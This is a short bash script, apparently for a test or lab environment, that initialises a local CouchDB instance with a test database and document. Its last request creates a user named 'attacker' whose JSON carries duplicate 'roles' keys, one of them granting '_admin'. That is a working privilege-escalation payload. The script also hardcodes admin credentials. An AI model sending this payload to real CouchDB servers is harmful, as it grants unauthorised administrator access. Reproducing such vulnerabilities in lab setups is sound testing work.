#!/bin/bash

# Wait for CouchDB to start
until curl -s http://admin:password@localhost:5984/_up; do
  echo "Waiting for CouchDB to start..."
  sleep 1
done

# Create a test database
curl -X PUT http://admin:password@localhost:5984/testdb

# Add a test document
curl -X POST http://admin:password@localhost:5984/testdb -H "Content-Type: application/json" \
  -d '{"name": "test_document", "type": "example"}'

# Create a user with duplicate roles
curl -X PUT http://admin:password@localhost:5984/_users/org.couchdb.user:attacker \
  -H "Content-Type: application/json" \
  -d '{"name": "attacker", "password": "attackerpass", "roles": ["_admin"], "roles": [], "type": "user"}'

# Confirmation message
echo "CouchDB is initialized with test data and a user with duplicate roles."